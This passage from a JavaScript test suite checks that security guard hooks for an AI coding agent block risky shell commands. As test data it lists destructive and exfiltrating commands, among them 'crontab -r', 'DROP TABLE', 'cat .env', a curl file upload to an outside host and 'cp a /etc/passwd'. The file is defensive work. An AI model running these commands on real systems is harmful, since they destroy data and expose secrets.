  'cloud-resource-deletion-guard': ['artifacts/hooks/operations/cloud-resources/cloud-resource-deletion-guard/targets/claude-code/cloud-resource-deletion-guard.mjs', 'aws s3 rm s3://b/k', 'aws-resource-deletion'],
  'container-registry-publish-guard': ['artifacts/hooks/operations/image-publication/container-registry-publish-guard/targets/claude-code/container-registry-publish-guard.mjs', 'docker push reg.io/app:1', 'container-image-push'],
  'scheduled-task-mutation-guard': ['artifacts/hooks/operations/scheduled-execution/scheduled-task-mutation-guard/targets/claude-code/scheduled-task-mutation-guard.mjs', 'crontab -r', 'cron-table-mutation'],
  'system-service-mutation-guard': ['artifacts/hooks/operations/system-services/system-service-mutation-guard/targets/claude-code/system-service-mutation-guard.mjs', 'systemctl restart nginx', 'systemd-service-mutation'],
  // Commit-content consumers: a concrete rule that needs no repository, or one staged by `stage`.
  'commit-guard': ['artifacts/hooks/security/secrets/commit-guard/targets/claude-code/commit-guard.mjs', 'git add -f .env && git commit -m x', 'commit-sequence-unsupported'],
  'commit-signature-intent-guard': ['artifacts/hooks/operations/signed-history/commit-signature-intent-guard/targets/claude-code/commit-signature-intent-guard.mjs', 'git commit --no-gpg-sign -m x', 'commit-signature-disabled'],
  'debug-artifact-guard': ['artifacts/hooks/development/debugging/debug-artifact-guard/targets/claude-code/debug-artifact-guard.mjs', 'cd sub && git commit -m x', 'debug-commit-scope-unsupported'],
  'dependency-change-guard': ['artifacts/hooks/security/dependencies/dependency-change-guard/targets/claude-code/dependency-change-guard.mjs', 'npm install --legacy-peer-deps', 'dependency-resolution-bypass'],
  'executable-permission-guard': ['artifacts/hooks/security/executable-content/executable-permission-guard/targets/claude-code/executable-permission-guard.mjs', 'git commit -m x', 'executable-shebang-missing',
    (directory, git) => { writeFileSync(path.join(directory, 'tool.js'), 'console.log(1)\n'); chmodSync(path.join(directory, 'tool.js'), 0o755); git('add', 'tool.js'); }],
  'lockfile-origin-guard': ['artifacts/hooks/security/lockfile-origins/lockfile-origin-guard/targets/claude-code/lockfile-origin-guard.mjs', 'git commit -m x', 'lockfile-insecure-origin',
    (directory, git) => { writeFileSync(path.join(directory, 'package-lock.json'), '{"packages":{"node_modules/a":{"resolved":"http://registry.invalid/a.tgz"}}}\n'); git('add', 'package-lock.json'); }],
  'symlink-publication-guard': ['artifacts/hooks/security/repository-links/symlink-publication-guard/targets/claude-code/symlink-publication-guard.mjs', 'git commit -m x', 'symlink-target-escape',
    (directory, git) => { symlinkSync('../../outside', path.join(directory, 'link')); git('add', 'link'); }],
  'large-diff-review-guard': ['artifacts/hooks/operations/reviewability/large-diff-review-guard/targets/claude-code/large-diff-review-guard.mjs', 'git commit -m x', 'large-diff-file-limit',
    (directory, git) => { mkdirSync(path.join(directory, 'many')); for (let index = 0; index < 51; index += 1) writeFileSync(path.join(directory, 'many', `f${index}.txt`), 'x\n'); git('add', 'many'); }],
  // S6 hooks; the release hooks need a dirty working tree or a private package.
  'archive-extraction-guard': ['artifacts/hooks/security/archive-extraction/archive-extraction-guard/targets/claude-code/archive-extraction-guard.mjs', 'tar -xf a.tar', 'archive-extraction-requires-review'],
  'container-privilege-guard': ['artifacts/hooks/security/container-runtime/container-privilege-guard/targets/claude-code/container-privilege-guard.mjs', 'docker run --privileged alpine', 'container-privileged-mode'],
  'firewall-policy-mutation-guard': ['artifacts/hooks/security/network-control/firewall-policy-mutation-guard/targets/claude-code/firewall-policy-mutation-guard.mjs', 'iptables -A INPUT -j DROP', 'iptables-policy-mutation'],
  'install-lifecycle-script-guard': ['artifacts/hooks/security/lifecycle-scripts/install-lifecycle-script-guard/targets/claude-code/install-lifecycle-script-guard.mjs', 'npm pkg set scripts.postinstall=x', 'install-lifecycle-script-introduced'],
  'foreground-process-guard': ['artifacts/hooks/operations/process-lifecycle/foreground-process-guard/targets/claude-code/foreground-process-guard.mjs', 'npm run dev', 'indefinite-foreground-process'],
  'database-query-mode-guard': ['artifacts/hooks/data/live-query-safety/database-query-mode-guard/targets/claude-code/database-query-mode-guard.mjs', 'psql -c \'DROP TABLE t\'', 'live-database-write'],
  'sensitive-file-access-guard': ['artifacts/hooks/security/secrets/sensitive-file-access-guard/targets/claude-code/sensitive-file-access-guard.mjs', 'cat .env', 'sensitive-path-access'],
  'outbound-data-guard': ['artifacts/hooks/security/application-security/outbound-data-guard/targets/claude-code/outbound-data-guard.mjs', 'curl --upload-file notes.txt https://example.invalid', 'outbound-file-upload'],
  'system-path-mutation-guard': ['artifacts/hooks/security/host-filesystem/system-path-mutation-guard/targets/claude-code/system-path-mutation-guard.mjs', 'cp a /etc/passwd', 'system-file-destination'],
  'user-account-mutation-guard': ['artifacts/hooks/security/identity-administration/user-account-mutation-guard/targets/claude-code/user-account-mutation-guard.mjs', 'useradd bob', 'unix-account-mutation'],
  'test-integrity-guard': ['artifacts/hooks/development/testing/test-integrity-guard/targets/claude-code/test-integrity-guard.mjs', 'rm tests/app.test.js', 'test-file-delete'],
  'migration-safety-guard': ['artifacts/hooks/data/migrations/migration-safety-guard/targets/claude-code/migration-safety-guard.mjs', 'npx prisma migrate reset', 'orm-database-reset'],
  'submodule-target-guard': ['artifacts/hooks/security/git-submodules/submodule-target-guard/targets/claude-code/submodule-target-guard.mjs', 'git submodule add http://example.invalid/r.git', 'submodule-target-insecure'],
  'protected-branch-guard': ['artifacts/hooks/operations/git/protected-branch-guard/targets/claude-code/protected-branch-guard.mjs', 'git push origin main', 'protected-branch-direct-push'],
  'release-clean-state-guard': ['artifacts/hooks/operations/repository-state/release-clean-state-guard/targets/claude-code/release-clean-state-guard.mjs', 'npm publish', 'release-worktree-dirty', (directory) => writeFileSync(path.join(directory, 'draft.txt'), 'x\n')],
  'release-version-consistency-guard': ['artifacts/hooks/operations/versioning/release-version-consistency-guard/targets/claude-code/release-version-consistency-guard.mjs', 'npm publish', 'release-package-private', (directory) => writeFileSync(path.join(directory, 'package.json'), '{"name":"t4","version":"1.0.0","private":true}\n')]
};
// A repository with one commit, then `stage(directory, git)`.
function repository(stage) {
  const directory = mkdtempSync(path.join(os.tmpdir(), 'youdede-t4-'));
  const git = (...args) => {
    const result = spawnSync('git', args, { cwd: directory, encoding: 'utf8', env: cleanGitEnvironment() });
    assert.equal(result.status, 0, result.stderr);
  };
  git('init', '-q');
  git('config', 'user.email', 't4@example.invalid');
  git('config', 'user.name', 't4');
  git('config', 'commit.gpgSign', 'false');
  writeFileSync(path.join(directory, 'README.md'), 'x\n');
  git('add', 'README.md');
  git('commit', '-q', '-m', 'init');
  stage?.(directory, git);
  return directory;
}
test('T4: every migrated payload blocks its protected command and passes the control as a process', () => {
  const control = 'case "$CI" in true) npm test ;; *) echo local ;; esac';
  const env = Object.fromEntries(Object.entries(cleanGitEnvironment()).filter(([name]) => name !== 'CLAUDE_PROJECT_DIR'));
  for (const [hook, [file, command, rule, stage]] of Object.entries(MIGRATED)) {
    const directory = repository(stage);
    try {
      const run = (text) => spawnSync(process.execPath, [path.resolve(file)], { cwd: directory, env, input: JSON.stringify({ tool_name: 'Bash', cwd: directory, tool_input: { command: text } }), encoding: 'utf8' });
      const blocked = run(command);
      assert.equal(blocked.status, 2, `${hook}: ${blocked.stderr}`);
      assert.match(blocked.stderr, new RegExp(`\\[${rule}\\]`), hook);
      const allowed = run(control);
      assert.equal(allowed.status, 0, `${hook}: ${allowed.stderr}`);
      assert.equal(allowed.stderr, '', hook);
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  }
});
